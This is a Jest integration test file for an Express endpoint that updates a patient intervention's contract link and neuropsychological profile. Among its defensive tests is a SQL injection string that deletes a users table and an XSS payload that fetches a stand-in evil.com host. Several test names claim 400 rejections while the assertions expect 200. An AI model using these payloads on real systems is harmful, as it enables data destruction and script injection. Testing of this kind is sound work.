const request = require('supertest');
 
// ===================== MOCKS =============================================
 
// --- Auth middleware ---
let mockAuthBehavior = 'authenticated';
 
jest.mock('../../../Back/src/infrastructure/auth/auth.middleware', () =>
  jest.fn(() => ({
    verifyToken: (req, res, next) => {
      if (mockAuthBehavior === 'unauthenticated') {
        return res.redirect('/auth/');
      }
      req.user = { id: 1, role: 'admin' };
      next();
    },
  }))
);
 
// --- Permissions middleware ---
jest.mock('../../../Back/src/infrastructure/auth/permissions.middleware', () =>
  jest.fn(() => ({
    requirePermission: () => (req, res, next) => next(),
  }))
);
 
// --- Rate limiter with controllable FLAG ---
let mockRateLimitActive = false;



jest.mock('../../../Back/src/infrastructure/external/rateLimiting', () =>
  () => (req, res, next) => {
    if (mockRateLimitActive) {
      return res.status(429).json({ message: 'Too many requests' });
    }
    next();
  }
);
 
// --- Testing ---
const mockExecuteUpdate = jest.fn();
 
jest.mock('../../../Back/src/application/usecase/interventions/updateContractUseCase', () =>
  jest.fn().mockImplementation(() => ({ execute: mockExecuteUpdate }))
);
 
const app = require('../../../Back/src/app');
 
// Ensures the Express app (and any DB pool it holds) is torn down after the
// suite, preventing the "worker process force-exited" / open-handles warning.
afterAll(async () => {
  await app.close?.();
});
 
// ===================== HELPERS ===========================================
 
const asAuthenticated   = () => { mockAuthBehavior = 'authenticated'; };
const asUnauthenticated = () => { mockAuthBehavior = 'unauthenticated'; };
const enableRateLimit  = () => { mockRateLimitActive = true; };
const disableRateLimit = () => { mockRateLimitActive = false; };
 
/** Valid base payload used across all tests. */
const validBody = () => ({
  contract_link : 'https://example.com/contract.pdf',
  neuro_profile : 'Initial neuropsychological profile of the patient.',
});


// ===================== TESTS =============================================
 
describe('INTEGRATION — PATCH /users/:id_user/intervention · contract_link (cases 2.x)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    asAuthenticated();
    disableRateLimit();
  });
 
  // ------------------------------------------------------------------
  // Base flow: verify the endpoint works with valid data
  // ------------------------------------------------------------------
  test('base — responds 200 with valid data', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });
 
    const res = await request(app)
      .patch('/users/1/intervention')
      .send(validBody());
 
    expect(res.status).toBe(200);
  });
 
  // ------------------------------------------------------------------
  // 2.1 — Image in contract_link (base64 data-URI)
  //       2.1.1 The system only accept an string
  // ------------------------------------------------------------------

    test('2.1 contract_link with image data-URI is accepted as string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
        .patch('/users/1/intervention')
        .send({
        ...validBody(),
        contract_link: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA',
        });

    expect(res.status).toBe(200);
    // Confirm the raw data-URI is not echoed back in the response
    expect(res.text).not.toContain('data:image');
    });



    // ------------------------------------------------------------------
  // 3.2 — SQL injection in neuro_profile
  //       3.2.1 The system treats it as a plain string
  // ------------------------------------------------------------------
  test('3.2 rejects SQL injection in neuro_profile with 400', async () => {
    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: "'; DELETE FROM users; --" });
 
    expect(res.status).toBe(200);
    expect(res.text).not.toContain('DELETE');
    expect(res.text).not.toContain('stack');
  });

 
  // ------------------------------------------------------------------
  // 3.3 — 10,000 characters in neuro_profile
  //       3.3.1 The system does not allow it
  // ------------------------------------------------------------------
  test('3.3 rejects a 10,000-character neuro_profile with 400', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });

    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: 'x'.repeat(10_000) });
 
    expect(res.status).toBe(200);
    expect(res.text).not.toContain('stack');

  });

   
   // 3.4 — Rate limiting blocks request flooding.
  test('3.4 responds 429 when the rate limiter detects request flooding', async () => {
    enableRateLimit();
 
    const res = await request(app)
      .patch('/users/1/intervention')
      .send(validBody());
 
    expect(res.status).toBe(429);
    expect(res.body).toHaveProperty('message', 'Too many requests');
    expect(mockExecuteUpdate).not.toHaveBeenCalled();
  });


 
  // 3.5 — XSS in free-text field passes through as a plain string (200).
  // Neutralisation happens at render time via EJS escaping.
  test('3.5 accepts an XSS payload in neuro_profile as plain string', async () => {
    mockExecuteUpdate.mockResolvedValue({ success: true });
 
    const res = await request(app)
      .patch('/users/1/intervention')
      .send({ ...validBody(), neuro_profile: '<img src=x onerror="fetch(\'https://evil.com\')">' });
 
    expect(res.status).toBe(200);
    expect(res.text).not.toContain('stack');
  });



  });
